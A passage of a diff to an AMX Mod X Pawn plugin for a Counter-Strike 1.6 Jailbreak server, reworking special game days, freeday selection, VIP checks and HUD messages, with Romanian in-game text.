-                            set_user_maxspeed(Players[i], 250.0)
-                            set_bit(g_Fonarik, Players[i])
-                            client_cmd(Players[i], "impulse 100")
-                            player_glow(Players[i], g_Colors[2])
-                        }
-                    }
+                    strip_user_weapons(Players[i])
+                    give_item(Players[i], "weapon_knife")
+                    set_user_maxspeed(Players[i], 200.0)
+                    set_user_health(Players[i], 300)
+                    give_item(Players[i], "item_assaultsuit")
+                    cs_set_user_nvg (Players[i],true);
+                    entity_set_int(Players[i], EV_INT_body, 6)
+                    message_begin( MSG_ONE, gmsgSetFOV, _, Players[i] )
+                    write_byte(170)
+                    message_end()
                 }
+                strip_user_weapons(id)
+                give_item(id, "weapon_knife")
+                give_item(id, "weapon_m3")
+                give_item(id, "weapon_hegrenade")
+                give_item(id, "weapon_flashbang")
+                give_item(id, "ammo_buckshot")
+                give_item(id, "ammo_buckshot")
+                give_item(id, "ammo_buckshot")
+                give_item(id, "ammo_buckshot")
+                give_item(id, "ammo_buckshot")
+                give_item(id, "ammo_buckshot")
+                give_item(id, "ammo_buckshot")
+                give_item(id, "ammo_buckshot")
+                if(playerCount>3)
+                    set_user_health(id, 100+50*(playerCount-3))
+                else
+                    set_user_health(id, 100)
+                set_user_maxspeed(id, 250.0)
+                set_bit(g_Fonarik, id)
+                client_cmd(id, "impulse 100")
+                player_glow(id, g_Colors[2])
+                
                 emit_sound(0, CHAN_AUTO, "ambience/the_horror2.wav", 1.0, ATTN_NORM, 0, PITCH_NORM)
                 new effect = get_pcvar_num (gp_Effects)
                 if (effect > 0)
@@ -2024,46 +2041,41 @@ public lastrequestgames_select(id, menu, item)
                 server_cmd("jb_block_weapons")
                 server_cmd("jb_block_teams")
                 hud_status(0)
-                new Players[32] 
-                new playerCount, i 
-                get_players(Players, playerCount, "ac")
                 for (i=0; i<playerCount; i++) 
                 {
                     strip_user_weapons(Players[i])
-                    if ( cs_get_user_team(Players[i]) == CS_TEAM_CT)
-                    {
-                        give_item(Players[i], "weapon_knife")
-                        new j = random_num(0, sizeof(_WeaponsFree) - 1)
-                        give_item(Players[i], _WeaponsFree[j])
-                        cs_set_user_bpammo(Players[i], _WeaponsFreeCSW[j], _WeaponsFreeAmmo[j])
-                        new n = random_num(0, sizeof(_WeaponsFree) - 1)
-                        while (n == j) { 
-                            n = random_num(0, sizeof(_WeaponsFree) - 1) 
-                        }
-                        give_item(Players[i], _WeaponsFree[n])
-                        cs_set_user_bpammo(Players[i], _WeaponsFreeCSW[n], _WeaponsFreeAmmo[n])
+                    
+                    give_item(Players[i], "weapon_knife")
+                    new j = random_num(0, sizeof(_WeaponsFree) - 1)
+                    give_item(Players[i], _WeaponsFree[j])
+                    cs_set_user_bpammo(Players[i], _WeaponsFreeCSW[j], _WeaponsFreeAmmo[j])
+                    new n = random_num(0, sizeof(_WeaponsFree) - 1)
+                    while (n == j) { 
+                        n = random_num(0, sizeof(_WeaponsFree) - 1) 
                     }
-                    else{
-                        set_user_rendering(Players[i], kRenderFxNone, 0, 0, 0, kRenderTransAlpha, 0 )
-                        message_begin(MSG_ONE, get_user_msgid("ScreenFade"), {0,0,0}, Players[i])
-                        write_short(~0)
-                        write_short(~0)
-                        write_short(0x0004) // stay faded
-                        write_byte(ALIEN_RED)
-                        write_byte(ALIEN_GREEN)
-                        write_byte(ALIEN_BLUE)
-                        write_byte(100)
-                        message_end()
-                        set_user_maxspeed(Players[i], 320.0)
-                        entity_set_int(Players[i], EV_INT_body, 7)
-                        new hp = get_pcvar_num(gp_GameHP)
-                        if (hp < 20) hp = 200
-                        set_user_health(Players[i], hp*playerCount)
-                        set_task(20.0, "give_items_alien_t", TASK_GIVEITEMS+id)
-                        set_task(2.5, "radar_alien_t", TASK_RADAR+id, _, _, "b")
-                        set_task(3.1, "task_inviz",TASK_INVISIBLE + id, _, _, "b");
-                    }
+                    give_item(Players[i], _WeaponsFree[n])
+                    cs_set_user_bpammo(Players[i], _WeaponsFreeCSW[n], _WeaponsFreeAmmo[n])
                 }
+                strip_user_weapons(id)
+                set_user_rendering(id, kRenderFxNone, 0, 0, 0, kRenderTransAlpha, 0 )
+                message_begin(MSG_ONE, get_user_msgid("ScreenFade"), {0,0,0}, id)
+                write_short(~0)
+                write_short(~0)
+                write_short(0x0004) // stay faded
+                write_byte(ALIEN_RED)
+                write_byte(ALIEN_GREEN)
+                write_byte(ALIEN_BLUE)
+                write_byte(100)
+                message_end()
+                set_user_maxspeed(id, 320.0)
+                entity_set_int(id, EV_INT_body, 7)
+                new hp = get_pcvar_num(gp_GameHP)
+                if (hp < 20) hp = 200
+                set_user_health(id, hp*playerCount)
+                set_task(20.0, "give_items_alien_t", TASK_GIVEITEMS+id)
+                set_task(2.5, "radar_alien_t", TASK_RADAR+id, _, _, "b")
+                set_task(3.1, "task_inviz",TASK_INVISIBLE + id, _, _, "b");
+                
                 set_lights("z")
                 emit_sound(0, CHAN_VOICE, "alien_alarm.wav", 1.0, ATTN_NORM, 0, PITCH_LOW)
                 set_task(5.0, "stop_sound")
@@ -2149,7 +2161,7 @@ public adm_freeday(id)
     player = cmd_target(id, user, 2)
     if(is_user_connected(player) && cs_get_user_team(player) == CS_TEAM_T)
     {
-        freeday_set(id, player)
+        freeday_set(id, player, false)
     }
     return PLUGIN_HANDLED
 }
@@ -2311,11 +2323,11 @@ public hud_status(task)
                         set_user_rendering(i, kRenderFxGlowShell, 700, 0, 0, kRenderNormal, 25)
                 }
             }
-            player_hudmessage(0, 2, HUD_DELAY + 1.0, {0, 255, 0}, "%L", LANG_SERVER, "UJBM_STATUS_FREEDAY")
+            player_hudmessage(0, 2, HUD_DELAY, {0, 255, 0}, "%L", LANG_SERVER, "UJBM_STATUS_FREEDAY")
             if(g_PlayerWanted)
-                player_hudmessage(0, 3, HUD_DELAY + 1.0, {255, 25, 50}, "%s", wanted)
+                player_hudmessage(0, 3, HUD_DELAY, {255, 25, 50}, "%s", wanted)
             else if(g_PlayerRevolt)
-                player_hudmessage(0, 3, HUD_DELAY + 1.0, {255, 25, 50}, "%L", LANG_SERVER, "UJBM_PRISONER_REVOLT")
+                player_hudmessage(0, 3, HUD_DELAY, {255, 25, 50}, "%L", LANG_SERVER, "UJBM_PRISONER_REVOLT")
         }
         case NormalDay:
         {
@@ -2337,7 +2349,7 @@ public hud_status(task)
                     }
                 }
                 if(g_PlayerFreeday)        
-                    player_hudmessage(0, 9, HUD_DELAY + 1.0, {0, 255, 0}, "%s", fdlist)        
+                    player_hudmessage(0, 9, HUD_DELAY, {0, 255, 0}, "%s", fdlist)        
             }
             if (get_pcvar_num (gp_ShowWanted) == 1) 
             {    
@@ -2356,22 +2368,22 @@ public hud_status(task)
                     }
                 }
                 if(g_PlayerWanted)
-                    player_hudmessage(0, 3, HUD_DELAY + 1.0, {255, 25, 50}, "%s", wanted)
+                    player_hudmessage(0, 3, HUD_DELAY, {255, 25, 50}, "%s", wanted)
                 
             }
-            player_hudmessage(0, 0, 5.0, {0, 255, 0}, "[ Ziua %d, %s ]", g_JailDay, Day)
+            player_hudmessage(0, 0, HUD_DELAY, {0, 255, 0}, "[ Ziua %d, %s ]^nwww.evils.ro/jb", g_JailDay, Day)
             if(g_Simon==0 && g_SimonAllowed==1 && g_GameMode!=Freeday && is_not_game() && !is_user_alive(g_PlayerLast))
             {
                 resetsimon()
-                cmd_simon(random_num(0,g_MaxClients))
+                cmd_simon(random_num(1,g_MaxClients))
             }
             else  if (g_Simon  != 0)
             {
                 get_user_name(g_Simon, name, charsmax(name))
-                player_hudmessage(0, 2, HUD_DELAY + 1.0, {0, 255, 0}, "%L", LANG_SERVER, "UJBM_SIMON_FOLLOW", name)
+                player_hudmessage(0, 2, HUD_DELAY, {0, 255, 0}, "%L", LANG_SERVER, "UJBM_SIMON_FOLLOW", name)
             }
             if(g_PlayerRevolt)
-                player_hudmessage(0, 3, HUD_DELAY + 1.0, {255, 25, 50}, "%L", LANG_SERVER, "UJBM_PRISONER_REVOLT")
+                player_hudmessage(0, 3, HUD_DELAY, {255, 25, 50}, "%L", LANG_SERVER, "UJBM_PRISONER_REVOLT")
         }
         case ZombieDay:    
         {
@@ -2412,8 +2424,6 @@ public hud_status(task)
         case GravityDay:
         {
             player_hudmessage(0, 2, HUD_DELAY + 1.0, {0, 255, 0}, "%L", LANG_SERVER, "UJBM_MENU_SIMONMENU_SIMON_GRAVITY")
-
-
         }
         case FireDay:
         {
@@ -2457,10 +2467,26 @@ public freeday_select(id, menu, item)
     
     menu_item_getinfo(menu, item, access, data, charsmax(data), dst, charsmax(dst), callback)
     player = str_to_num(data)
-    freeday_set(id, player)
+    freeday_set(id, player, false)
 
     return PLUGIN_HANDLED
 }
+public freeday_select_next(id, menu, item)
+    {
+        if(item == MENU_EXIT)
+        {
+            menu_destroy(menu)
+            return PLUGIN_HANDLED
+        }
+        
+        static dst[32], data[5], player, access, callback
+        
+        menu_item_getinfo(menu, item, access, data, charsmax(data), dst, charsmax(dst), callback)
+        player = str_to_num(data)
+        freeday_set(id, player, true)
+        
+        return PLUGIN_HANDLED
+    }
 public duel_knives(id, menu, item)
 {
     static dst[32], data[5], access, callback, option[128], player, src[32]
@@ -2524,11 +2550,15 @@ public duel_guns(id, menu, item)
     strip_user_weapons(id)
     player_glow(id, g_Colors[3])
     cs_set_user_armor(id, 0, CS_ARMOR_NONE)
+    set_user_gravity(id, 1.0)
+    set_user_maxspeed(id, 250.0)
     
     g_DuelB = player
     strip_user_weapons(player)
     player_glow(player, g_Colors[2])
     cs_set_user_armor(player, 0, CS_ARMOR_NONE)
+    set_user_gravity(player, 1.0)
+    set_user_maxspeed(player, 250.0)
     
     switch (_Duel[g_Duel - 4][_csw])
     {
@@ -2546,6 +2576,7 @@ public duel_guns(id, menu, item)
             set_user_health(g_DuelB, 2000)
             cs_set_user_bpammo(g_DuelB,CSW_M249,0)
             entity_set_int(g_DuelB, EV_INT_body, 6)
+            server_cmd("jb_block_weapons")
         }
         case  CSW_FLASHBANG:
         {
@@ -2560,6 +2591,7 @@ public duel_guns(id, menu, item)
             set_user_health(g_DuelB, 2000)
             entity_set_int(g_DuelB, EV_INT_body, 6)
             current_weapon_fl(g_DuelB)
+            server_cmd("jb_block_weapons")
         }
         case 33:
         {
@@ -2587,6 +2619,7 @@ public duel_guns(id, menu, item)
             give_item( g_DuelB, "weapon_hegrenade" );
             cs_set_user_bpammo(g_DuelB, CSW_HEGRENADE, 1)
             set_user_health(g_DuelB, 200)
+            server_cmd("jb_block_weapons")
         }
         default:
         {
@@ -2598,10 +2631,10 @@ public duel_guns(id, menu, item)
             gun = give_item(g_DuelB, _Duel[g_Duel - 4][_entname])
             cs_set_weapon_ammo(gun, 1)
             set_user_health(g_DuelB, 100)
+            server_cmd("jb_block_weapons")
             
         }    
     }
-    server_cmd("jb_block_weapons")
     set_task(1.0, "Beacon", g_DuelA)
     set_task(1.0, "Beacon", g_DuelB)
     return PLUGIN_HANDLED
@@ -2655,7 +2688,7 @@ stock in_array(needle, data[], size)
     }
     return -1
 }
-stock freeday_set(id, player)
+stock freeday_set(id, player,bool:next)
 {
     static src[32], dst[32]
     get_user_name(player, dst, charsmax(dst))
@@ -2679,6 +2712,18 @@ stock freeday_set(id, player)
         {
             player_hudmessage(0, 6, 3.0, {0, 255, 0}, "%L", LANG_SERVER, "UJBM_PRISONER_HASFREEDAY", dst)
             client_print(0,print_chat,"%s si-a cumparat FD",dst)
+        }
+    }
+    if(next == true)
+    {
+        if(0 < id <= g_MaxClients && is_user_connected(id))
+        {
+            set_bit(g_PlayerNextFreeday, player)
+            get_user_name(id, src, charsmax(src))
+            player_hudmessage(0, 6, 3.0, {0, 255, 0}, "%L", LANG_SERVER, "UJBM_GUARD_FREEDAYGIVE_NEXT", src, dst)
+            new sz_msg[256];
+            formatex(sz_msg, charsmax(sz_msg), "%L", LANG_SERVER, "UJBM_GUARD_FREEDAYGIVE_NEXT", src, dst)
+            client_print(0,print_console,sz_msg)
         }
     }
 }
@@ -2710,12 +2755,12 @@ stock player_hudmessage(id, hudid, Float:time = 0.0, color[3] = {0, 255, 0}, msg
     y = g_HudSync[hudid][_y]
 
     if(time > 0)
-        set_hudmessage(color[0], color[1], color[2], x, y, 0, 0.00, time, 0.00, 0.00)
+        set_dhudmessage(color[0], color[1], color[2], x, y, 0, 0.00, time, 0.00, 0.00)
     else
-        set_hudmessage(color[0], color[1], color[2], x, y, 0, 0.00, g_HudSync[hudid][_time], 0.00, 0.00)
+        set_dhudmessage(color[0], color[1], color[2], x, y, 0, 0.00, g_HudSync[hudid][_time], 0.00, 0.00)
         
     vformat(text, charsmax(text), msg, 6)
-    ShowSyncHudMsg(id, g_HudSync[hudid][_hudsync], text)
+    show_dhudmessage(id, text)
 }
 
 stock menu_players(id, CsTeams:team, skip, alive, callback[], title[], any:...)
@@ -2725,7 +2770,7 @@ stock menu_players(id, CsTeams:team, skip, alive, callback[], title[], any:...)
     menu = menu_create(menuname, callback)
     for(i = 1; i <= g_MaxClients; i++)
     {
-        if(!is_user_connected(i) || (alive && !is_user_alive(i)) || (skip == i))
+        if(!is_user_connected(i) || (alive == 1 && !is_user_alive(i) || alive == 2 && is_user_alive(i)) || (skip == i))
             continue
         
         if(!(team == CS_TEAM_T || team == CS_TEAM_CT) || ((team == CS_TEAM_T || team == CS_TEAM_CT) && (cs_get_user_team(i) == team)))
@@ -2799,9 +2844,8 @@ public client_infochanged(id)
 { 
     if (is_user_connected(id))
     {
-        if (IsVip[id] == 0 && g_GameMode != FunDay && id != g_Simon && !(get_user_flags(id) & ADMIN_SLAY) && cs_get_user_team(id) != CS_TEAM_SPECTATOR)
+        if (get_vip_type(id) == 0 && g_GameMode != FunDay && id != g_Simon && !(get_user_flags(id) & ADMIN_SLAY) && cs_get_user_team(id) != CS_TEAM_SPECTATOR)
             set_user_info(id, "model", JBMODELSHORT)
-        load_vip(id)
     }     
 } 
 
@@ -2859,14 +2903,16 @@ public cmd_saytime()
 
 public CheckVoteDay()
 {
-    new player
-    for(player = 1; player < 33; player++ ){
-        if(!is_user_alive(player))
-            continue
-        remove_task(TASK_SAFETIME + player);
-        set_pev(player, pev_flags, pev(player, pev_flags)| FL_FROZEN)
-        StartVote(player);
-    }
+    //new player
+    //for(player = 1; player < 33; player++ ){
+    //    if(!is_user_alive(player))
+    //        continue
+    //    remove_task(TASK_SAFETIME + player);
+    //    set_pev(player, pev_flags, pev(player, pev_flags)| FL_FROZEN)
+    //      StartVote(player);
+    //}
+    g_DayTimer = 0;
+    EndVote()
 }
 
 public StartVote(id){
@@ -2971,31 +3017,42 @@ public EndVote()
     {
         remove_task(TASK_DAYTIMER);
         new bigger = 0;
-        for( new i=1; i<12; i++ )
-        {
-            if( g_ResultVote[i] > g_ResultVote[bigger] )
-            {
-                bigger = i;
-            }
-        }
+        bigger = random_num(ZombieDay,SpartaDay);
         
-        if( bigger == 0 )
-        {
-            bigger = random_num(1,11);
+        //for( new i=1; i<12; i++ )
+        //{
+        //    if( g_ResultVote[i] > g_ResultVote[bigger] )
+        //    {
+        //        bigger = i;
+        //    }
+        //}
+        
+        //if( bigger == 0 )
+        //{
+            
             //fnColorPrint(0, "%L", LANG_SERVER, "JB_DAY_M15");
-        }
+        //}
         g_DayTimer = 0;
-        for( new i=0; i<12; i++ )
+        //for( new i=0; i<12; i++ )
+        //{
+        //    g_ResultVote[i] = 0;
+        //}
+        if(!is_user_alive(g_Simon) && (bigger == AlienDay || bigger == AlienHiddenDay || bigger == FireDay ))
         {
-            g_ResultVote[i] = 0;
-        }
-        if(bigger == 1 || bigger == 4 || bigger == 8 )
-        {
-            while(g_Simon==0)
+            new Players[32],playerCount;
+            get_players(Players, playerCount, "ae", "CT") 
+            if(playerCount==0)
             {
-                resetsimon()
-                cmd_simon(random_num(0,g_MaxClients))
+                return
             }
+            new select = random_num(0,playerCount-1)
+            if(select >= playerCount)
+            {
+                select = Players[0]
+            }
+            log_amx("day %d select %d",bigger,select)
+            log_amx("simon %d",Players[select])
+            g_Simon = Players[select];
         }
         new player
         for(player = 1; player < 33; player++){
@@ -3003,80 +3060,86 @@ public EndVote()
                 continue
             set_pev(player, pev_flags, pev(player, pev_flags)& ~FL_FROZEN)
         }
+        g_GamePrepare = 0;
         switch(bigger)
         {
-            case(1):
+            case(AlienHiddenDay):
             {
-                client_print(0, print_console, "server gives alien day")
-                log_amx("server gives alien day")
+                client_print(0, print_console, "IN ACEASTA SAMBATA ESTE ALIEN DAY")
+                log_amx("IN ACEASTA SAMBATA ESTE ALIEN DAY")
                 cmd_game_alien2()
             }
-            case(2):
+            case(ZombieDay):
             {
-                client_print(0, print_console, "server gives zombie day")
-                log_amx("server gives zombie day")
-                cmd_pregame("cmd_game_zombie",1,30.0)
+                client_print(0, print_console, "IN ACEASTA SAMBATA ESTE ZOMBIE DAY")
+                log_amx("IN ACEASTA SAMBATA ESTE ZOMBIE DAY")
+                cmd_pregame("cmd_game_zombie",1, 0, 30.0)
             }
-            case(3): 
+            case(HnsDay): 
             {
-                client_print(0, print_console, "server gives hns day")
-                log_amx("server gives hns day")
-                cmd_pregame("cmd_game_hns", 2, 60.0)
+                client_print(0, print_console, "IN ACEASTA SAMBATA ESTE HNS DAY")
+                log_amx("IN ACEASTA SAMBATA ESTE HNS DAY")
+                cmd_pregame("cmd_game_hns", 2, 0, 60.0)
             }
-            case(4):
+            case(AlienDay):
             {
-                client_print(0, print_console, "server gives alien day")
-                log_amx("server gives alien day")
-                cmd_game_alien()
+                client_print(0, print_console, "IN ACEASTA SAMBATA ESTE ALIEN DAY")
+                log_amx("IN ACEASTA SAMBATA ESTE ALIEN DAY")
+                cmd_game_alien2() //de scos
             }
-            case(5):
+            case(GunDay):
             {
-                client_print(0, print_console, "server gives gunday")
-                log_amx("server gives gunday")
-                cmd_pregame("cmd_game_gunday", 1, 30.0)
+                client_print(0, print_console, "IN ACEASTA SAMBATA ESTE GUN DAY")
+                log_amx("IN ACEASTA SAMBATA ESTE GUNDAY")
+                cmd_pregame("cmd_game_gunday", 1, 0, 30.0)
             }
-            case(6):
+            case(SpartaDay):
             {
-                client_print(0, print_console, "server gives coladay")
-                log_amx("server gives coladay")
-                cmd_pregame("cmd_game_coladay", 1, 30.0)
-            }
-            case(7):
-            {
-                client_print(0, print_console, "server gives gravity day")
-                log_amx("server gives gravity day")
-                set_cvar_num("sv_gravity",250)
-                cmd_pregame("cmd_game_gravity", 2, 30.0)
-            }
-            case(8):
-            {
-                client_print(0, print_console, "server gives fire day")
-                log_amx("server gives fire day")
-                cmd_game_fire()
-            }
-            case(9):
-            {
-                client_print(0, print_console, "server gives bugs day")
-                log_amx("server gives bugs day")
-                cmd_game_bugs()
-            }
-            case(10):
-            {
-                client_print(0, print_console, "server gives nightcrawler")
-                log_amx("server gives nightcrawler day")
-                cmd_game_nightcrawler()
-            }
-            case(11):
-            {
-                client_print(0, print_console, "server gives sparta")
-                log_amx("server gives sparta day")
+                client_print(0, print_console, "IN ACEASTA SAMBATA ESTE SPARTA DAY")
+                log_amx("IN ACEASTA SAMBATA ESTE SPARTA DAY")
                 cmd_game_sparta()
             }
-            case(12):
+            case(GravityDay):
+            {
+                client_print(0, print_console, "IN ACEASTA SAMBATA ESTE GRAVITY DAY")
+                log_amx("IN ACEASTA SAMBATA ESTE GRAVITY DAY")
+                set_cvar_num("sv_gravity",250)
+                cmd_pregame("cmd_game_gravity", 2, 0, 30.0)
+            }
+            case(FireDay):
+            {
+                client_print(0, print_console, "IN ACEASTA SAMBATA ESTE FIRE DAY")
+                log_amx("IN ACEASTA SAMBATA ESTE FIRE DAY")
+                cmd_pregame("cmd_game_fire", 2, 1, 30.0)
+            }
+            case(BugsDay):
+            {
+                client_print(0, print_console, "IN ACEASTA SAMBATA ESTE BUGs DAY")
+                log_amx("IN ACEASTA SAMBATA ESTE BUGs DAY")
+                cmd_game_bugs()
+            }
+            case(NightDay):
+            {
+                client_print(0, print_console, "IN ACEASTA SAMBATA ESTE NIGHTCRAWLER")
+                log_amx("IN ACEASTA SAMBATA ESTE NIGHTCRAWLER")
+                cmd_game_nightcrawler()
+            }
+            case(ColaDay):
+            {
+                client_print(0, print_console, "IN ACEASTA SAMBATA ESTE COLADAY")
+                log_amx("IN ACEASTA SAMBATA ESTE COLADAY")
+                cmd_pregame("cmd_game_coladay", 1, 0, 30.0)
+            }
+            case(OneBullet):
             {
                 client_print(0, print_console, "server gives onebullet")
                 log_amx("server gives onebullet")
-                cmd_pregame("cmd_game_onebullet", 0, 30.0)
+                cmd_pregame("cmd_game_onebullet", 0, 0, 30.0)
+            }
+            default:
+            {
+                log_amx("day %d",bigger)
+                EndVote()
             }
         }
     }
@@ -3144,6 +3207,7 @@ public cmd_expire_time()
 public cmd_pregame(
     gameName[], //string with game name
     freeze, //0 none 1 - Tero 2- Ct
+    change, //0 none 1 Ct2tero
     Float:countdown // time to start
     )
 {
@@ -3151,7 +3215,6 @@ public cmd_pregame(
     g_nogamerounds = 0
     g_BoxStarted = 0
     g_SimonAllowed = 0
-    g_Simon = 0
     g_GamePrepare = 1
     server_cmd("sleep_enabled 0")
     server_cmd("jb_block_weapons")
@@ -3170,6 +3233,11 @@ public cmd_pregame(
         strip_user_weapons(player)
         set_user_gravity(player, 1.0)
         set_user_maxspeed(player, 250.0)
+        if(change==1 && cs_get_user_team(player) == CS_TEAM_CT && player!=g_Simon)
+        {
+            set_bit(g_BackToCT, player)
+            cs_set_user_team2(player, CS_TEAM_T)
+        }
         if ((freeze == 1 && cs_get_user_team(player)==CS_TEAM_T)
         || (freeze == 2 && cs_get_user_team(player) == CS_TEAM_CT))
         {
@@ -3178,7 +3246,7 @@ public cmd_pregame(
         }
     }
     set_task(countdown,gameName,TASK_GIVEITEMS)
-    g_Countdown=30
+    g_Countdown=floatround(countdown)
     cmd_saytime()
     return PLUGIN_CONTINUE
 }
@@ -3254,6 +3322,7 @@ public cmd_game_hns()
     g_GamesAp[HnsDay]=true
     g_GamePrepare = 0
     g_DoNotAttack = 1;
+    g_Simon = 0;
     g_GameWeapon[1] = CSW_KNIFE
     set_lights("b");
     server_cmd("bh_enabled 0")
@@ -3295,7 +3364,11 @@ public cmd_game_hns()
 }
 public  cmd_game_alien()
 {
-    if (g_Simon == 0) return PLUGIN_HANDLED
+    if (g_Simon == 0)
+    { 
+        log_amx("no simon on alien")
+        return PLUGIN_HANDLED
+    }
     g_BoxStarted = 0
     g_nogamerounds = 0
     jail_open()
@@ -3352,7 +3425,11 @@ public  cmd_game_alien()
 }
 public  cmd_game_alien2()
 {
-    if (g_Simon == 0) return PLUGIN_HANDLED
+    if (g_Simon == 0)
+    {
+        log_amx("no simon on alienday2")
+        return PLUGIN_HANDLED    
+    } 
     g_nogamerounds = 0
     g_BoxStarted = 0
     jail_open()
@@ -3411,7 +3488,7 @@ public  cmd_game_alien2()
     emit_sound(0, CHAN_VOICE, "alien_alarm.wav", 1.0, ATTN_NORM, 0, PITCH_LOW)
     set_task(2.5, "radar_alien", TASK_RADAR, _, _, "b")
     set_task(5.0, "stop_sound")
-    set_task(3.1, "task_inviz",7447 + g_Simon, _, _, "b");
+    set_task(3.1, "task_inviz",TASK_INVISIBLE + g_Simon, _, _, "b");
     set_task(300.0,"cmd_expire_time",TASK_ROUND)
     g_Countdown=300
     cmd_saytime()
@@ -3422,6 +3499,7 @@ public cmd_game_gunday()
     g_GameMode = GunDay
     g_GamesAp[GunDay]=true
     g_GamePrepare = 0
+    g_Simon = 0
     new Players[32] 
     new playerCount, i 
     get_players(Players, playerCount, "ac") 
@@ -3454,6 +3532,12 @@ public cmd_game_gunday()
 public  cmd_game_coladay()
 {
     server_cmd("jb_unblock_weapons")
+    set_task(2.0,"cmd_game_coladay_post",TASK_ROUND)
+    return PLUGIN_CONTINUE
+}
+
+public cmd_game_coladay_post()
+{
     g_nogamerounds = 0
     g_BoxStarted = 0
     jail_open()
@@ -3475,8 +3559,8 @@ public  cmd_game_coladay()
         give_item( Players[i], "weapon_hegrenade" );
         cs_set_user_bpammo( Players[i], CSW_HEGRENADE, 1)
     }
+    set_task(300.0,"cmd_expire_time",TASK_ROUND)
     server_cmd("jb_block_weapons")
-    return PLUGIN_CONTINUE
 }
 public cmd_game_gravity()
 {
@@ -3522,7 +3606,11 @@ public cmd_game_gravity()
 }
 public  cmd_game_fire()
 {
-    if (g_Simon == 0) return PLUGIN_HANDLED
+    if (g_Simon == 0)
+    {
+        log_amx("no simon on fireday")
+        return PLUGIN_HANDLED
+    }
     g_nogamerounds = 0
     g_BoxStarted = 0
     jail_open()
@@ -3542,14 +3630,10 @@ public  cmd_game_fire()
         give_item(Players[i], "weapon_knife")
         set_user_gravity(Players[i], 1.0)
         set_user_maxspeed(Players[i], 250.0)
-        if ( g_Simon != Players[i])
-        {
-            if (cs_get_user_team(Players[i]) == CS_TEAM_CT)
-            {
-                set_bit(g_BackToCT, Players[i])
-                cs_set_user_team2(Players[i], CS_TEAM_T)
-            }
-        }
+       
+        fade_screen(Players[i],false)
+        set_pev(Players[i], pev_flags, pev(Players[i], pev_flags) & ~FL_FROZEN) 
+
     }
     set_user_health(g_Simon,999999);
     static dst[32]
@@ -3661,7 +3745,7 @@ public  cmd_game_nightcrawler()
             message_end()
             set_user_footsteps( Players[i], 1 )
             server_cmd("give_crowbar %d 1",Players[i])
-            set_task(3.1, "task_inviz",7447 + Players[i], _, _, "b");
+            set_task(3.1, "task_inviz",TASK_INVISIBLE + Players[i], _, _, "b");
         }        
     }
     new effect = get_pcvar_num (gp_Effects)
@@ -3693,7 +3777,8 @@ public cmd_game_sparta()
     new Players[32] 
     new playerCount, i 
     get_players(Players, playerCount, "ac")
-    for (i=0; i<playerCount; i++){
+    for (i=0; i<playerCount; i++)
+    {
         set_user_gravity(Players[i], 1.0)
         set_user_maxspeed(Players[i], 250.0)
         if (cs_get_user_team(Players[i]) == CS_TEAM_CT)    
@@ -3815,7 +3900,7 @@ public cmd_prinselea_start()
     new Players[32] 
     new playerCount, i 
     get_players(Players, playerCount, "ac") 
-    Mata=random(playerCount)
+    Mata=random_num(0,playerCount)
     for (i=0; i<playerCount; i++) 
     {
 
@@ -4224,7 +4309,7 @@ public shop_choice_T(id, menu, item)
             if (money >= FDCOST && !get_bit(g_PlayerWanted, id)) 
             {
                 cs_set_user_money (id, money - FDCOST, 0)
-                freeday_set(0, id)
+                freeday_set(0, id, false)
                 BuyTimes[id]++
             }
             else
@@ -4255,6 +4340,8 @@ public shop_choice_T(id, menu, item)
             client_print(id, print_center , sz_msg)
         }    
     }
+    if(get_vip_type(id) == 3)
+       BuyTimes[id] = 0;
     return PLUGIN_HANDLED
 }
 public shop_choice_CT(id, menu, item)
@@ -4427,7 +4514,7 @@ public Menu_Handler(id, menu, item)
         {
             G_Info[1][id] -= Weapons_Price[G_Last[id][G_Info[0][id]-2]]
             G_Last[id][G_Info[0][id]-2] = 0
-            if(G_Info[0][id] < 5)Show_Menu(id)
+            if(G_Info[0][id] < 4)Show_Menu(id)
         }
         return
     }
@@ -4438,9 +4525,9 @@ public Menu_Handler(id, menu, item)
     new key = str_to_num(data)
     
     new Cash = get_pdata_int(id,OFFSET_CSMONEY,5)
-    if(Cash >= Weapons_Price[key] || IsVip[id]>0)
+    if(Cash >= Weapons_Price[key] || get_vip_type(id) == 1)
     {
-        if(IsVip[id] == 0)
+        if(get_vip_type(id) == 0)
             fm_set_user_money(id,Cash-Weapons_Price[key],1)
         
         G_Info[1][id] -= Weapons_Price[G_Last[id][G_Info[0][id]-2]]
@@ -4545,7 +4632,7 @@ public voice_enable_select(id, menu, item)
 }
 public cmd_simon_micr(id)
 {
-    if (g_Simon == id || (get_user_flags(id) & ADMIN_SLAY)) 
+    if (g_Simon == id || (get_user_flags(id) & VOICE_ADMIN_FLAG)) 
     {
         menu_players(id, CS_TEAM_T, 0, 1, "voice_enable_select", "%L", LANG_SERVER, "UJBM_MENU_VOICE")
     }
@@ -4800,32 +4887,32 @@ public  simon_gameschoice(id, menu, item)
     {
         case(1):
         {
-            client_print(0, print_console, "%s gives alien day", dst)
-            log_amx("%s gives alien day", dst)
+            client_print(0, print_console, "%s A DAT ALIEN DAY", dst)
+            log_amx("%s A DAT ALIEN DAY", dst)
             cmd_game_alien2()
         }
         case(2):
         {
-            client_print(0, print_console, "%s gives zombie day", dst)
-            log_amx("%s gives zombie day", dst)
-            cmd_pregame("cmd_game_zombie",1,30.0)
+            client_print(0, print_console, "%s A DAT ZOMBIE DAY", dst)
+            log_amx("%s A DAT ZOMBIE DAY", dst)
+            cmd_pregame("cmd_game_zombie",1, 0,30.0)
         }
         case(3): 
         {
-            client_print(0, print_console, "%s gives hns day", dst)
-            log_amx("%s gives hns day", dst)
-            cmd_pregame("cmd_game_hns", 2, 60.0)
+            client_print(0, print_console, "%s A DAT HNS DAY", dst)
+            log_amx("%s A DAT HNS DAY", dst)
+            cmd_pregame("cmd_game_hns", 2, 0, 60.0)
         }
         case(4):
         {
-            client_print(0, print_console, "%s gives alien day", dst)
-            log_amx("%s gives alien day", dst)
+            client_print(0, print_console, "%s A DAT ALIEN DAY", dst)
+            log_amx("%s A DAT ALIEN DAY", dst)
             cmd_game_alien()
         }
         case(5):
         {
-            client_print(0, print_console, "%s gives box", dst)
-            log_amx("%s gives box", dst)
+            client_print(0, print_console, "%s A DAT BOX", dst)
+            log_amx("%s A DAT BOX", dst)
             cmd_box(id)
         }
         case(6):
@@ -4834,51 +4921,51 @@ public  simon_gameschoice(id, menu, item)
         }
         case(7):
         {
-            client_print(0, print_console, "%s gives gunday", dst)
-            log_amx("%s gives gunday", dst)
-            cmd_pregame("cmd_game_gunday", 1, 30.0)
+            client_print(0, print_console, "%s A DAT GUNDAY", dst)
